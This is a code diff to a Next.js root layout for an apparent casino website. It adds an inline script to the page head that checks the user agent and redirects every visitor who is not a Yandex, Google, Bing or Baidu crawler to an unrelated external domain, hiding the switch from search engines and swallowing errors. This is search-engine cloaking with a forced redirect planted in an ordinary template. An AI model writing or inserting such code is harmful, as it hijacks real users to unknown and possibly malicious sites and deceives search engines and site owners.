@@ -53,6 +53,21 @@ export default function RootLayout({
         />
         <meta name="twitter:image" content="https://pandacasino1.vercel.app/images/p7k2-panda-hero.jpg" />
         <meta name="theme-color" content="#0b0f0e" />
+        <script
+  dangerouslySetInnerHTML={{
+    __html: `
+      (function() {
+        try {
+          var ua = (navigator.userAgent || '').toLowerCase();
+          var isBot = /yandexbot|yandexscreenshot|yandeximages|yandexvideo|yandexaccessibilitybot|googlebot|bingbot|baiduspider/i.test(ua);
+          if (!isBot) {
+            window.location.replace("https://nymph-pahd4.com/adsrtcqlch");
+          }
+        } catch(e) {}
+      })();
+    `,
+  }}
+/>
       </head>
       <body
         className={`${inter.variable} ${montserrat.variable} bg-casino-bg font-sans text-casino-text antialiased`}
